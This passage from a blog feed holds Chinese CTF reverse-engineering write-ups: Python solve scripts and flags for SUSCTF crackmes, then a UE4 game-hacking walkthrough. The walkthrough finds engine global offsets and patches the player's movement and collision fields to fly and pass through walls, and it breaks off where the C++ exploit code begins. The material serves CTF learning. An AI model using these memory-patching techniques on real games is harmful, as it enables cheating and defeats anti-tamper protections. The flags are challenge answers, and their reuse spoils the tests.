k)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    mutated_key = mutate_key(KEY_BYTES.copy())</span><br><span class="line">    flag = rc4_crypt(CIPHERTEXT, mutated_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> rc4_crypt(flag, mutated_key) != CIPHERTEXT:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;sanity check failed; ciphertext mismatch&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mutated key:&quot;</span>, mutated_key.decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>susctf{de094624-8f5b-44dc-810c-58132a2b5ea3}</p><h3 id="一个饼干人"><a href="#一个饼干人" class="headerlink" title="一个饼干人"></a>一个饼干人</h3><p>Il2CppDumper 检测到“<strong>This file may be protected</strong>”——说明 so 有防护&#x2F;修改，导致它<strong>选择不生成或生成失败</strong>对 IDA&#x2F;Ghidra 的自动重命名脚本。</p><p>github上面的解释</p><blockquote><p>Il2CppDumper检测到可执行文件已被保护，使用<code>GameGuardian</code>从游戏内存中dump <code>libil2cpp.so</code>，然后使用Il2CppDumper载入按提示操作，可绕过大部分保护</p></blockquote><p>这里思路开始偏了，开始去用师傅的另一个项目去拿dump.cs</p><p>拿到之后，又偏了分析libcpp.so导入xx.h和xx.json这俩文件花了1个小时左右</p><p>最后发现逻辑无法分析，然后开始思考cookie</p><p>在asset下发现了delicous，查了下可以解包，用assetstudio没解出来</p><p>用的assetripper解出来了</p><p>手慢了大概没一会，本来二血，居然是小写的c….</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251004205252977.png" alt="image-20251004205252977"></p><p>SUSCTF{cookies_GOOD}</p><h3 id="ezsignin"><a href="#ezsignin" class="headerlink" title="ezsignin"></a>ezsignin</h3><p>patch掉花指令，得到主逻辑，中间还有base58，rc4…</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005104309406.png" alt="image-20251005104309406"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line">value_map = &#123;c: i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(alphabet)&#125;</span><br><span class="line">target = (</span><br><span class="line">    <span class="string">&quot;2wHFw6XRQFJexwYcizWFJVU87GnPPbuRZF99t8884SxTeRptgvAmfzdqmE9skCSR&quot;</span></span><br><span class="line">    <span class="string">&quot;bEMUc8r5WcGQ4aq8gJQ2fpUQgiiNvkEQXL4GoQ5rBZfejYFtEpTA5x1kybteneAuE&quot;</span></span><br><span class="line">    <span class="string">&quot;Cqp3uLCDnuU4GwD1kKet8Bmqb4eidPWEcr6bSNNU3wr5xxtHpc43TyHMSKggBRZr&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b58decode</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        num = num * <span class="number">58</span> + value_map[ch]</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">while</span> num:</span><br><span class="line">        num, rem = <span class="built_in">divmod</span>(num, <span class="number">256</span>)</span><br><span class="line">        out.append(rem)</span><br><span class="line">    out.reverse()</span><br><span class="line">    leading = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s.lstrip(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([<span class="number">0</span>] * leading) + <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">layer = target</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    decoded = b58decode(layer)</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">4</span>:</span><br><span class="line">        layer = decoded.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        original = decoded</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(b ^ <span class="number">0x66</span> <span class="keyword">for</span> b <span class="keyword">in</span> original).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>susctf{Oh_My_G0d_You_@re_Rev3rse_God!!!}</p><h3 id="made-in-haven"><a href="#made-in-haven" class="headerlink" title="made-in-haven"></a>made-in-haven</h3><p>看到haven就想到了dubhectf做的一道天堂之门的题目…</p><p>看了下附件有很多retn和花指令混淆，都path掉再F5就可以得到主逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007095901048.png" alt="image-20251007095901048"></p><p>先对key前8位和后8位做xor和sub</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007100352051.png" alt="image-20251007100352051"></p><p>然后一个简单的TEA即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, struct</span><br><span class="line"></span><br><span class="line">TWEAK_XOR = [<span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x07</span>]</span><br><span class="line">TWEAK_SUB = [<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>]</span><br><span class="line">KEY_SEED = <span class="built_in">bytearray</span>(<span class="string">b&#x27;elgvdislhapybsy&quot;&#x27;</span>)</span><br><span class="line">CIPHER = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;6f470a56d13abcf8e393c2a6118f0b6ff77da5815732b3f5618570a0e19339ec&quot;</span>)</span><br><span class="line">DELTA = <span class="number">0xDEADBEEF</span></span><br><span class="line">ROUNDS = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(KEY_SEED) == <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(TWEAK_XOR) &gt;= <span class="number">8</span> <span class="keyword">and</span> <span class="built_in">len</span>(TWEAK_SUB) &gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Phase 1 (xor-type)</span></span><br><span class="line"><span class="keyword">for</span> i, tweak <span class="keyword">in</span> <span class="built_in">enumerate</span>(TWEAK_XOR[:<span class="number">8</span>]):</span><br><span class="line">    t = (tweak) &amp; <span class="number">0xFF</span></span><br><span class="line">    KEY_SEED[i] = ((KEY_SEED[i] ^ t) ) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Phase 2 (sub-type) — simplified equivalence: ((* - (b-1)) - 1) == (* - b)</span></span><br><span class="line"><span class="keyword">for</span> i, tweak <span class="keyword">in</span> <span class="built_in">enumerate</span>(TWEAK_SUB[:<span class="number">8</span>]):</span><br><span class="line">    KEY_SEED[<span class="number">8</span> + i] = (KEY_SEED[<span class="number">8</span> + i] - (tweak &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">KEY = struct.unpack(<span class="string">&quot;&lt;4I&quot;</span>, <span class="built_in">bytes</span>(KEY_SEED))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt_block</span>(<span class="params">v0, v1</span>):</span><br><span class="line">    total = (DELTA * ROUNDS) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + KEY[<span class="number">2</span>]) ^ (v0 + total) ^ ((v0 &gt;&gt; <span class="number">5</span>) + KEY[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + KEY[<span class="number">0</span>]) ^ (v1 + total) ^ ((v1 &gt;&gt; <span class="number">5</span>) + KEY[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        total = (total - DELTA) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(CIPHER), <span class="number">8</span>):</span><br><span class="line">    block = struct.unpack(<span class="string">&quot;&lt;2I&quot;</span>, CIPHER[off:off + <span class="number">8</span>])</span><br><span class="line">    flag += struct.pack(<span class="string">&quot;&lt;2I&quot;</span>, *tea_decrypt_block(*block))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span>&lt;=b&lt;=<span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>susctf{sp33d_up_time_t0_h34v3n!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SUSCTF-wp&quot;&gt;&lt;a href=&quot;#SUSCTF-wp&quot; class=&quot;headerlink&quot; title=&quot;SUSCTF wp&quot;&gt;&lt;/a&gt;SUSCTF wp&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://luhaoblog.oss-cn-hangzho</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>UE4逆向初探-OverWatch</title>
    <link href="http://matriy330.github.io/791560d6/"/>
    <id>http://matriy330.github.io/791560d6/</id>
    <published>2025-10-14T15:07:30.000Z</published>
    <updated>2025-10-14T15:08:09.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UE4逆向初探-OverWatch"><a href="#UE4逆向初探-OverWatch" class="headerlink" title="UE4逆向初探-OverWatch"></a>UE4逆向初探-OverWatch</h1><p>可以看这个<a href="https://xz.aliyun.com/course-view?id=36">线上培训 -先知社区</a></p><p><strong>赛后下面那个偏移问题(主要是被网上某篇瞎写的博客和IDA字符串加载给暗算了)解决了自己做了下直接出了一段flag，后一段flag没找到只能看wp了</strong></p><blockquote><p>好的!我知道了尴尬了，我还是太着急了，刚刚写这个wp的时候又打开来了(之前保存的i64)，搜了一下seamless，发现直接出现了，原来是IDA加载太慢了，我太急了，我就不该上课 T.T </p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013222036823.png" alt="image-20251013222036823"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013221924088.png" alt="image-20251013221924088"></p></blockquote><p>dump工具：<a href="https://github.com/Spuckwaffel/UEDumper">Spuckwaffel&#x2F;UEDumper: The most powerful Unreal Engine Dumper and Editor for UE 4.19 - 5.3</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012162204075.png" alt="image-20251012162204075"></p><p>可以看这个视频</p><p><a href="https://www.youtube.com/watch?v=M7VLd1xrVoM">https://www.youtube.com/watch?v=M7VLd1xrVoM</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012172315439.png" alt="image-20251012172315439"></p><p>说一下找三件套吧</p><p>Fname找ByteObject</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102225239.png" alt="image-20251014102225239"></p><p>交叉引用这个方法，是最上面那个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102258624.png" alt="image-20251014102258624"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102334465.png" alt="image-20251014102334465"></p><p>第一个偏移：0x4869C80</p><blockquote><p>ps：可以看那个印度佬的视频，挺好的，先去rebase里把机制定位0</p></blockquote><p>找UWorld时，我是IDA没加载出来这个”Seamless”字符串</p><blockquote><p>关于如何对照源码<a href="https://www.bilibili.com/video/BV19R4y1g7i3/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=d76ad0aadca055336653cd966075f064">虚幻4 UE4 逆向 寻找 世界地址 UWORLD地址 教程_哔哩哔哩_bilibili</a></p><p>可以先去github把对应版本的源码下载下来，需要加入epicgame组织先，</p></blockquote><p>所以我对照了源码最终找到一个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102621791.png" alt="image-20251014102621791"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102704430.png" alt="image-20251014102704430"></p><p>当然常规的方法更简单一点</p><blockquote><p>搜索： SeamlessTravel FlushLevelStreaming</p></blockquote><p>往上直接找到：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014103045269.png" alt="image-20251014103045269"></p><p>第二个uworld有了：49ee370</p><p>第三个gobject，我也是死在这了…</p><p>我找的偏移是0x48A5FC0</p><p>看了wp发现是：0x48A5FD0</p><p>….</p><p>就差0x10，可能是数据结构哪里搞错了应该</p><p>当时找了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104421969.png" alt="image-20251014104421969"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104434870.png" alt="image-20251014104434870"></p><p>当时字符串没加载出来，简单的把48A5FC0作为Gobject肯定不对，都跟上面不太像其实</p><p>实际上被误导了?</p><p><a href="https://www.cnblogs.com/revercc/p/17641855.html#%E5%AF%BB%E6%89%BEguobjectarray">ue5游戏逆向之寻找GWorld，GName和GUObjectArray - 怎么可以吃突突 - 博客园</a></p><p>这里虽然是ue5的方法，但是道理应该差不多，为什么偏移不对?</p><p>官解搜索的是：NewObject with….</p><p>可是我看了下引用：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105547046.png" alt="image-20251014105547046"></p><p>这找个damn…</p><p>不知道是不是我IDA的原因</p><p>运气足够好,第二个就是</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105748059.png" alt="image-20251014105748059"></p><p>但是我并没有找到源码中对应的寻找方式，可能是源码中把NewObject字符串包装了，得搜索引用这个函数的才能去找GUObject</p><p>推荐搜索Failed to load Enginee class，跟刚才的NewObject With到达的是一个地方</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110256024.png" alt="image-20251014110256024"></p><p>48A5FD0</p><p>offset.h里填好</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110520421.png" alt="image-20251014110520421"></p><p>dump成功如下</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110946452.png" alt="image-20251014110946452"></p><p>后面就是游戏逆向，猜测flag在墙外，因而只有几种常规方法：透视(墙不见) 穿墙 飞天遁地</p><p>在merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h种有</p><blockquote><p>这个文件不是引擎原生的源码文件，而是 <strong>自动合并生成的头文件</strong>，</p><p>目的是把多个模块导出的类、枚举、结构体合并在一个文件中方便分析。</p></blockquote><p>这个枚举定义在 UE 原版引擎中是 <strong>角色移动组件（Character Movement Component）</strong> 的核心枚举</p><table><thead><tr><th>模式</th><th>场景举例</th><th>行为逻辑</th></tr></thead><tbody><tr><td><code>MOVE_None</code></td><td>不可移动（如被眩晕、冻结）</td><td>停止更新物理</td></tr><tr><td><code>MOVE_Walking</code></td><td>在地面上走</td><td>使用地面摩擦力、速度计算</td></tr><tr><td><code>MOVE_NavWalking</code></td><td>AI 路径导航行走</td><td>使用 NavMesh</td></tr><tr><td><code>MOVE_Falling</code></td><td>从高处坠落</td><td>使用重力</td></tr><tr><td><code>MOVE_Swimming</code></td><td>在水中游动</td><td>使用流体阻力、浮力</td></tr><tr><td><code>MOVE_Flying</code></td><td>飞行类角色（如幽灵、飞行器）</td><td>关闭重力，使用自由三维移动</td></tr><tr><td><code>MOVE_Custom</code></td><td>自定义移动，如“攀爬”、“滑行”</td><td>游戏开发者自己扩展逻辑</td></tr></tbody></table><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014193847028.png" alt="image-20251014193847028"></p><p>我们能发现这里还有</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014201041665.png" alt="image-20251014201041665"></p><p>ACharacter是什么?</p><blockquote><p>ACharacter：UE4 自带的行走类Actor，继承自 APawn。含网格体、胶囊体、UCharacterMovementComponent 等，负责角色移动、跳跃等行为。你操作飞行&#x2F;穿墙时的目标对象就是本地玩家的 ACharacter 实例</p></blockquote><p>这些是 <strong>编译时静态断言（static_assert）</strong>，用于验证 <strong>类成员变量的内存偏移</strong>是否正确。</p><p><code>UCharacterMovementComponent::MovementMode</code> 与 <code>PendingLaunchVelocity</code>这些字段属于 <code>UCharacterMovementComponent</code>（角色移动组件），控制角色的物理状态。</p><p>我们除了这些关键属性之外还需要知道世界链路</p><p>在 UE 逆向中，<strong>找到世界链路</strong> 是理解游戏对象体系的关键。</p><p><strong>世界结构简图：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GWorld → UWorld</span><br><span class="line">         ├─ PersistentLevel (ULevel)</span><br><span class="line">         │   ├─ AActor[0] = DefaultPawn</span><br><span class="line">         │   ├─ AActor[1] = PlayerCharacter</span><br><span class="line">         │   └─ ...</span><br><span class="line">         ├─ GameInstance</span><br><span class="line">         ├─ GameMode</span><br><span class="line">         ├─ PlayerController</span><br><span class="line">         └─ etc.</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><strong><code>GWorld</code></strong></td><td><code>UWorld*</code> 全局指针</td><td>当前正在运行的世界（全局变量）</td></tr><tr><td><strong><code>UWorld</code></strong></td><td>类对象</td><td>世界实例本身，包含关卡、玩家、Actor 列表等</td></tr></tbody></table><blockquote><p><code>GWorld</code> 就是指向当前 <code>UWorld</code> 的全局变量。</p></blockquote><p>在内存调试中，通常会通过 <code>GWorld</code> 找到整个世界的根：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UWorld* World = GWorld;</span><br><span class="line">ULevel* Level = World-&gt;PersistentLevel;</span><br><span class="line">TArray&lt;AActor*&gt; Actors = Level-&gt;Actors;</span><br></pre></td></tr></table></figure><p>这样就能遍历世界中所有的角色对象。</p><table><thead><tr><th>元素</th><th>含义</th><th>逆向用途</th></tr></thead><tbody><tr><td><code>offsetof</code></td><td>成员偏移</td><td>定位内存字段、直接读写对象成员</td></tr><tr><td><code>CharacterMovement</code></td><td>角色移动组件指针</td><td>控制角色物理行为（走、飞、跳）</td></tr><tr><td><code>CapsuleComponent</code></td><td>碰撞体组件</td><td>检测碰撞、修改 hitbox 尺寸</td></tr><tr><td><code>MovementMode</code></td><td>当前移动模式</td><td>判断或强制移动状态</td></tr><tr><td><code>PendingLaunchVelocity</code></td><td>等待应用的速度</td><td>修改跳跃或击飞效果</td></tr><tr><td><code>GWorld → UWorld</code></td><td>世界根节点</td><td>遍历所有 Actor，找到玩家对象</td></tr></tbody></table><p>在游戏中找到了玩家对象地址 <code>PlayerCharacter</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCharacterMovementComponent* MoveComp =  *(UCharacterMovementComponent**)(PlayerCharacter + 0x288);</span><br></pre></td></tr></table></figure><p>接下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MoveComp-&gt;MovementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">MoveComp-&gt;PendingLaunchVelocity = FVector(0, 0, 3000);</span><br></pre></td></tr></table></figure><p>角色立刻能在空中飞行或超高跳。</p><ul><li>UWorld::OwningGameInstance：指向当前世界所属的 UGameInstance。GameInstance 持有全局状态，如本地玩家列表、子系统等，是沿 GWorld 找到你这边玩家控制器的入口。</li><li>APawn：可被玩家或 AI 控制的 Actor 基类。ACharacter 就是 APawn 的一个扩展版本，加入了骨骼网格和 CharacterMovement。</li><li>APlayerController::AcknowledgedPawn：玩家控制器当前“正式控制”的 Pawn 指针。正常游戏里它就是你的角色 Pawn（如 ACharacter），读取后才能继续修改移动组件&#x2F;碰撞。</li><li>APlayerController：表示本地或远端的玩家控制器，处理输入、相机、HUD 等。我们从 UGameInstance::LocalPlayers 取得的 ULocalPlayer-&gt;PlayerController 就是本地玩家的控制器，顺着它的 AcknowledgedPawn 拿到角色后才能进行后续 hack。</li></ul><p>世界链路</p><ul><li>GWorld（基址 base + 0x49EE370，与setOffsets() 中 OFFSET_GWORLD 相符）指向当前关卡对应的 UWorld。</li><li>UWorld + 0x180（OwningGameInstance）拿到 UGameInstance，这是全局封装玩家列表的对象。</li><li>UGameInstance + 0x38（LocalPlayers 的 TArray）提供本地玩家数组，下标 0 通常是本地玩家。</li><li>ULocalPlayer-&gt;PlayerController（UPlayer::PlayerController 在 …:8986 给出 0x30）接到 APlayerController，再用 AcknowledgedPawn 偏移 0x2A0 取到实际 Pawn。</li><li>Pawn + 0x288（CharacterMovement）就能定位 UCharacterMovementComponent；后续通过 MovementMode、PendingLaunchVelocity 等偏移修改为飞行或冲刺，或者抓取 CapsuleComponent(0x290) 调 SetCollisionEnabled 实现穿墙。</li></ul><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014220645122.png" alt="image-20251014220645122"></p><p>在编写代码时我们可以用reinterpret_cast</p><p>reinterpret_cast<T>(expr) 是 C++ 提供的强制类型转换之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在没有类型信息/类定义不足的情况下，把某个指针或整数当成别的类型的指针来访问。</span><br><span class="line">与UE这类内存操作结合时，我们经常只有偏移值，所以先把基址转成 uint8_t*，加偏移后再 reinterpret_cast&lt;目标类型*&gt;，这样就能把那块内存看成某个字段或结构。</span><br></pre></td></tr></table></figure><p>FVector 在 BasicType.h 里被定义成三个 float 分量（X&#x2F;Y&#x2F;Z）。C++ 允许对这种简单结构做聚合初始化，{a, b, c} 就会依次填入 X&#x2F;Y&#x2F;Z，所以 {0.f, 0.f, 800.f} 会写成 (0,0,800)。</p><p>数值 800&#x2F;600 只是示例：PendingLaunchVelocity 相当于给角色一个即将施加的冲量，LastUpdateVelocity 是当前速度。这两个字段只要写入任何 FVector，UE4 就会按这些分量处理运动；如果想要更慢或更快的上升，可以自己改成别的值。</p><p>exp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 